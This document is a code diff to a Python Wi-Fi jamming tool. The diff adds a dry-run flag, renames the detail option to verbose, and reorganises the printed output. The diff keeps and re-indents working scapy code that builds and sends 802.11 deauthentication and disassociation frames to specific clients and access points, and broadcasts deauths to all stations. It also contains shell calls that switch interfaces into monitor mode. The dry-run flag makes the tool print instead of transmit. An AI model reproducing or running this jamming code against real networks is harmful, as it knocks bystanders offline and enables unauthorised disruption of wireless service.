@@ -68,6 +68,7 @@ class wifijammer:
         self.mTimeout   = float(args["timeout"])
         self.mChannel   = pyw.chget(pyw.getcard(self.mInterface))
         self.mDetailed  = args['details']
+        self.dryRun     = args['dryrun']
         self.mLoglevel  = args['loglevel']
         self.mSSID      = args['ssid']
 
@@ -108,7 +109,6 @@ class wifijammer:
         return
 
     def jam(self):
-        print(self.cTarget)
         self.hop = Thread(target=self.channel_hop)
         self.hop.daemon = True
         self.hop.start()
@@ -178,16 +178,15 @@ class wifijammer:
             self.deauth()
 
     def output(self):
-        print(
-            "[{0}+{1}] {2} channel {0}{3}{1}".format(
-                G,
-                W,
-                self.mInterface,
-                str(self.mChannel)
-            )
-        )
-
         if self.mDetailed:
+            print(
+                 "[{0}+{1}] {2} channel {0}{3}{1}".format(
+                     G,
+                     W,
+                     self.mInterface,
+                    str(self.mChannel)
+                    )
+                 )
             with threadLock:
                 print('\n                  Deauthing                 ch   ESSID')
                 for ca in self.clients:
@@ -206,7 +205,7 @@ class wifijammer:
                     else:
                         print(
                             "[{0}*{1}] {2}{3}{1} - {2}{4}{1} - {5}".format(
-                                C,
+                                                    C,
                                 W,
                                 P,
                                 ca[0],
@@ -214,20 +213,20 @@ class wifijammer:
                                 str(ca[2]).ljust(4)
                             )
                         )
-        with threadLock:
-            print('\n      Access Points     ch     ESSID')
-            for ap in self.APs:
-                print(
-                    "[{0}*{1}] {2}{3}{1}    - {4} - {0}{5}{1} - {2}{6}{1}".format(
-                        C,
-                        W,
-                        P,
-                        ap[0],
-                        str(ap[1]).ljust(5),
-                        ap[2][:22].ljust(25),
-                        str(len([x[0] for x in self.clients if x[0].lower() == ap[0].lower()]))
+            with threadLock:
+                print('\n      Access Points     ch     ESSID')
+                for ap in self.APs:
+                    print(
+                        "[{0}*{1}] {2}{3}{1}    - {4} - {0}{5}{1} - {2}{6}{1}".format(
+                            C,
+                            W,
+                            P,
+                            ap[0],
+                            str(ap[1]).ljust(5),
+                            ap[2][:22].ljust(25),
+                            str(len([x[0] for x in self.clients if x[0].lower() == ap[0].lower()]))
+                            )
                         )
-                    )
         return
 
     def deauth(self):
@@ -242,16 +241,18 @@ class wifijammer:
                     ch = x[2]
                     #print(str(ch)+":"+str(self.mChannel))
                     if int(ch) == int(self.mChannel):
-                        #print("Deauthing client {0} who is connected to AP {1} on channel {2}".format(client, ap, ch))
-                        deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
-                        deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
-                        disas_pkt1 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Disas()
-                        disas_pkt2 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Disas()
-                        pkts.append(deauth_pkt1)
-                        pkts.append(deauth_pkt2)
+                        if self.dryRun: 
+                            print("DRY RUN MODE: Deauthing client {0} who is connected to AP {1} on channel {2}".format(ap, client, ch))
+                        else: 
+                            deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
+                            deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
+                            disas_pkt1 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Disas()
+                            disas_pkt2 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Disas()
+                            pkts.append(deauth_pkt1)
+                            pkts.append(deauth_pkt2)
 
-                        pkts.append(disas_pkt1)
-                        pkts.append(disas_pkt2)
+                            pkts.append(disas_pkt1)
+                            pkts.append(disas_pkt2)
 
         if len(self.APs) > 0:
             if not self.mDirected:
@@ -261,8 +262,11 @@ class wifijammer:
                         ch = a[1]
                         # print(str(ch)+":"+str(self.mChannel))
                         if int(ch) == int(self.mChannel):
-                            deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
-                            pkts.append(deauth_ap)
+                            if self.dryRun: 
+                                print("DRY RUN MODE: Deauthing AP {0} on channel {1}".format(ap, ch))
+                            else: 
+                                deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
+                                pkts.append(deauth_ap)
 
         if len(pkts) > 0:
             for p in pkts:
@@ -443,11 +447,17 @@ def parse_args():
         dest="skip",
         help="Skip deauthing this MAC address")
 
-    parser.add_argument("-D", "--details",
+    parser.add_argument("-v", "--verbose",
         default=False,
         dest="details",
         action='store_true',
         help="Detailed print out like default wifijammer")
+
+    parser.add_argument("-D", "--dryrun",
+        default=False,
+        dest="dryrun",
+        action='store_true',
+        help="Dry run. Print deauth packets, but do not actually send any deauths")
 
     parser.add_argument("-g", "--loglevel",
         default='info',
@@ -480,7 +490,6 @@ def start_mon_mode(interface):
         os.system('ip link set %s down' % interface)
         os.system('iwconfig %s mode monitor' % interface)
         os.system('ip link set %s up' % interface)
-        print("done with that")
         return interface
     except Exception:
         sys.exit('['+R+'-'+W+'] Could not start monitor mode')
